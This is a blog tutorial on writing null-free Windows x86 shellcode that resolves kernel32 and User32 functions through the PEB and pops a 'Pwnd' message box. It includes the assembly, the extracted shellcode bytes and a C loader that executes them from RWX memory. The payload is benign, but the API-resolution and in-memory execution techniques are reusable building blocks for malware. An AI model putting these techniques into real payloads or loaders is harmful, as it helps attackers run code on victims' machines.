---
layout: single
title: Win32 Shellcode - Spawn MessageBox
date: 2019-11-12
classes: wide
header:
  teaser: /assets/images/shell.png
tags:
  - Assembly
  - Pentester
  - Windows
  - Shellcode
  - x86
--- 
![](/assets/images/shell.png)<br>

## Introduction
[In the last post](https://blackcloud.me/Win32-shellcode-2/) we spawned the Calculator on Windows x86. Now we'll move on a more complicated object. We want to spawn a MessageBox with custom title and text. In this case the MesssageBox function is in the User32.dll library so we need to intruduce a new method: loading a different dll, searching the MessageBox function inside the library and use the with the right parameters.
For our puproses we need to introdice a new function called LoadLibraryA that help us loading the new User32.dll.<br>
The others concepts are more or less the same of the past shellcode

## The Shellcode
As you can see the first part is the same of the Calc shellcode, but instead of call the ```CreateProcessA``` function, we need the ```LoadLibraryA``` function.
Once the EAX is populated with its address we can call ```LoadLibrary("User32.dll")``` to load the right dll. Then we can use ```GetProcAddress``` to find the ```MessageBoxA``` function inside the right library, ```GetProcAddress(User32.dll, MessageBoxA)```, last thing is to build the right data structure that rapresent the arguments of the ```MessageBoxA``` function, accordingly with the [MSDN](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messagebox) documentation.<br>
The comments in the code help understand how it works:<br>
```assembly
global _start

section .text
_start:


getkernel32:
	xor ecx, ecx                ; zeroing register ECX
	mul ecx                     ; zeroing register EAX EDX
	mov eax, [fs:ecx + 0x030]   ; PEB loaded in eax
	mov eax, [eax + 0x00c]      ; LDR loaded in eax
	mov esi, [eax + 0x014]      ; InMemoryOrderModuleList loaded in esi
	lodsd                       ; program.exe address loaded in eax (1st module)
	xchg esi, eax				
	lodsd                       ; ntdll.dll address loaded (2nd module)
	mov ebx, [eax + 0x10]       ; kernel32.dll address loaded in ebx (3rd module)

	; EBX = base of kernel32.dll address

getAddressofName:
	mov edx, [ebx + 0x3c]       ; load e_lfanew address in ebx
	add edx, ebx				
	mov edx, [edx + 0x78]       ; load data directory
	add edx, ebx
	mov esi, [edx + 0x20]       ; load "address of name"
	add esi, ebx
	xor ecx, ecx

	; ESI = RVAs

getProcAddress:
	inc ecx                             ; ordinals increment
	lodsd                               ; get "address of name" in eax
	add eax, ebx				
	cmp dword [eax], 0x50746547         ; GetP
	jnz getProcAddress
	cmp dword [eax + 0x4], 0x41636F72   ; rocA
	jnz getProcAddress
	cmp dword [eax + 0x8], 0x65726464   ; ddre
	jnz getProcAddress

getProcAddressFunc:
	mov esi, [edx + 0x24]       ; offset ordinals
	add esi, ebx                ; pointer to the name ordinals table
	mov cx, [esi + ecx * 2]     ; CX = Number of function
	dec ecx
	mov esi, [edx + 0x1c]       ; ESI = Offset address table
	add esi, ebx                ; we placed at the begin of AddressOfFunctions array
	mov edx, [esi + ecx * 4]    ; EDX = Pointer(offset)
	add edx, ebx                ; EDX = getProcAddress
	mov ebp, edx                ; save getProcAddress in EBP for future purpose

getLoadLibraryA:
	xor ecx, ecx                ; zeroing ecx
	push ecx                    ; push 0 on stack
	push 0x41797261             ; 
	push 0x7262694c             ;  AyrarbiLdaoL
	push 0x64616f4c             ;
	push esp
	push ebx                    ; kernel32.dll
	call edx                    ; call GetProcAddress and find LoadLibraryA address

	; EAX = LoadLibraryA address
	; EBX = Kernel32.dll address
	; EDX = GetProcAddress address 

getUser32:
	push 0x61616c6c                 ;
	sub word [esp + 0x2], 0x6161    ; aalld.23resU
	push 0x642e3233                 ; 
	push 0x72657355                 ; 
	push esp
	call eax                        ; call Loadlibrary and load User32.dll

	; EAX = User32.dll address
	; EBX = Kernel32.dll address
	; EBP = GetProcAddress address 

getMessageBox:
	push 0x6141786f                 ; aAxo : 6141786f
	sub word [esp + 0x3], 0x61
	push 0x42656761                 ; Bega : 42656761
	push 0x7373654d	                ; sseM : 7373654d
	push esp
	push eax                        ; User32.dll
	call ebp                        ; GetProcAddress(User32.dll, MessageBoxA)

	; EAX 76C6EA71 User32.MessageBoxA
	; ECX 76C10000 OFFSET User32.#2499
	; EDX 00005A12
	; EBX 75290000 kernel32.75290000
	; ESP 0022FF74 ASCII "32.dll"
	; EBP 752E1837 kernel32.GetProcAddress
	; ESI 75344DD0 kernel32.75344DD0
	; EDI 00000000
	; EIP 004010A4 getMessa.004010A4

MessageBoxA:
	add esp, 0x010                  ; clean the stack
	xor edx, edx
	xor ecx, ecx
    push edx 						
    push 'Pwnd'
    mov edi, esp
    push edx
    push 'Yess'
    mov ecx, esp
	push edx                        ; hWnd = NULL
	push edi                        ; the title "dnwP"
	push ecx                        ; the message "sseY"
	push edx                        ; uType = NULL
	call eax                        ; MessageBoxA(windowhandle,msg,title,type)

Exit:
	add esp, 0x010              ; clean the stack
	push 0x61737365             ; asse
	sub word [esp + 0x3], 0x61  ; asse -a 
	push 0x636F7250	            ; corP
	push 0x74697845             ; tixE
	push esp
	push ebx
	call ebp

	xor ecx, ecx
	push ecx
	call eax



```
Compile it and test it

```bash
root@root:# nasm -f elf32 getMessagebox_shellcode.nasm ; ld -melf_i386 -o getMessagebox_shellcode getMessagebox_shellcode.o 

root@root:# objdump -d ./getMessagebox_shellcode|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc9\xf7\xe1\x64\x8b\x41\x30\x8b\x40"
"\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10"
"\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda"
"\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01"
"\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81"
"\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78"
"\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24"
"\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c"
"\x01\xde\x8b\x14\x8e\x01\xda\x89\xd5\x31"
"\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69"
"\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff"
"\xd2\x68\x6c\x6c\x61\x61\x66\x81\x6c\x24"
"\x02\x61\x61\x68\x33\x32\x2e\x64\x68\x55"
"\x73\x65\x72\x54\xff\xd0\x68\x6f\x78\x41"
"\x61\x66\x83\x6c\x24\x03\x61\x68\x61\x67"
"\x65\x42\x68\x4d\x65\x73\x73\x54\x50\xff"
"\xd5\x83\xc4\x10\x31\xd2\x31\xc9\x52\x68"
"\x50\x77\x6e\x64\x89\xe7\x52\x68\x59\x65"
"\x73\x73\x89\xe1\x52\x57\x51\x52\xff\xd0"
"\x83\xc4\x10\x68\x65\x73\x73\x61\x66\x83"
"\x6c\x24\x03\x61\x68\x50\x72\x6f\x63\x68"
"\x45\x78\x69\x74\x54\x53\xff\xd5\x31\xc9"
"\x51\xff\xd0"
```
The shellcode.c file

```c
#include <stdio.h>
#include <windows.h>

int main()
{

    char* shellcode = \
    "\x31\xc9\xf7\xe1\x64\x8b\x41\x30\x8b\x40"
	"\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10"
	"\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda"
	"\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01"
	"\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81"
	"\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78"
	"\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24"
	"\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c"
	"\x01\xde\x8b\x14\x8e\x01\xda\x89\xd5\x31"
	"\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69"
	"\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff"
	"\xd2\x68\x6c\x6c\x61\x61\x66\x81\x6c\x24"
	"\x02\x61\x61\x68\x33\x32\x2e\x64\x68\x55"
	"\x73\x65\x72\x54\xff\xd0\x68\x6f\x78\x41"
	"\x61\x66\x83\x6c\x24\x03\x61\x68\x61\x67"
	"\x65\x42\x68\x4d\x65\x73\x73\x54\x50\xff"
	"\xd5\x83\xc4\x10\x31\xd2\x31\xc9\x52\x68"
	"\x50\x77\x6e\x64\x89\xe7\x52\x68\x59\x65"
	"\x73\x73\x89\xe1\x52\x57\x51\x52\xff\xd0"
	"\x83\xc4\x10\x68\x65\x73\x73\x61\x66\x83"
	"\x6c\x24\x03\x61\x68\x50\x72\x6f\x63\x68"
	"\x45\x78\x69\x74\x54\x53\xff\xd5\x31\xc9"
	"\x51\xff\xd0"; 
			
    printf("shellcode length: %i", strlen(shellcode));

    LPVOID lpAlloc = VirtualAlloc(0, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(lpAlloc, shellcode, strlen(shellcode));

    ((void(*)())lpAlloc)();

    return 0;
}
```
Compile it on Windows 
```dos
c:\MinGW\bin>gcc shellcode.c -o shellcode
```

Windows 7 (x86)
![](/assets/images/windows/x86/getmsg_0.gif)<br>

and Windows 10 (x86)

![](/assets/images/windows/x86/getmsg_1.gif)<br>

The length is 223 bytes and is NULL free.<br>
[In the next post](https://blackcloud.me/Win32-shellcode-4/) we will spawn a Reverse shell.

## References
- [This amazing book](https://nostarch.com/malware) help me a lot understand how Win32 kernel API works
- [The amazing h0mbre blog](https://h0mbre.github.io/Babys-First-Shellcode/) 
- [Introduction to Windows Shellcode Development – Part 3](https://securitycafe.ro/2016/02/15/introduction-to-windows-shellcode-development-part-3/) by [@NytroRST](https://twitter.com/NytroRST/)
- [Windows Shellcoding x86 – Hunting Kernel32.dll – Part 1](https://0xdarkvortex.dev/index.php/2019/03/18/windows-shellcoding-x86-hunting-kernel32-dll-part-1/) by [@NinjaParanoid](https://twitter.com/NinjaParanoid)
- [Shellcoding for Linux and Windows Tutorial](http://www.vividmachines.com/shellcode/shellcode.html#ws) by [Steve Hanna](https://twitter.com/lestevehanna)
- [A good paper book](http://hick.org/code/skape/papers/win32-shellcode.pdf)
- [Windows x86 MessageBox shellcode](https://marcosvalle.github.io/re/exploit/2019/01/19/messagebox-shellcode.html) by [@MValle](https://twitter.com/_mvalle_) 
- [The PacketStorm Calc Shellcode](https://packetstormsecurity.com/files/102847/All-Windows-Null-Free-CreateProcessA-Calc-Shellcode.html)
- [My Github Win x86 shellcode repo](https://github.com/bolonobolo/shellcode)